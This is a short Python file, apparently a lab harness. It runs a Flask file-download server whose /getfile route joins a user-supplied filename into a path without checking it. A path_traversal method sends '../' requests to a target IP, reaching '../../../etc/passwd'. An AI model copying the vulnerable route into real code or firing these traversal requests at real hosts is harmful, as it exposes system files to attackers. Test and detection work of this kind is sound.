from flask import Flask, request, send_file 
import os
import urllib.request
import threading
from time import sleep
from werkzeug.serving import make_server

class WebServer(threading.Thread):
    def __init__(self):
        super().__init__()
        self.stop_event = threading.Event()
        self.app = Flask(__name__)
        self.server = None
        
        @self.app.route('/getfile')
        def download():
            try:
                filename = request.args.get('file')
                file_path = f"/var/www/files/{filename}"
                if os.path.isfile(file_path):
                    sending_msg = send_file(file_path)
                else:
                    sending_msg = "No file"
                
            except Exception as e:
                print(e)
            print(sending_msg)
            return sending_msg
        


    def run(self):
        self.server = make_server("0.0.0.0", 5000, self.app)
        self.ctx = self.app.app_context()
        self.ctx.push()
        print("WebServer started")
        self.server.serve_forever()

    def shutdown(self):
        print("Webserver shutdown")
        if self.server:
            self.server.shutdown()

    

    def path_traversal(self, target_ip, duration):
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../../etc/passwd").read()
        print(f"sleep: {duration}")
        sleep(duration)

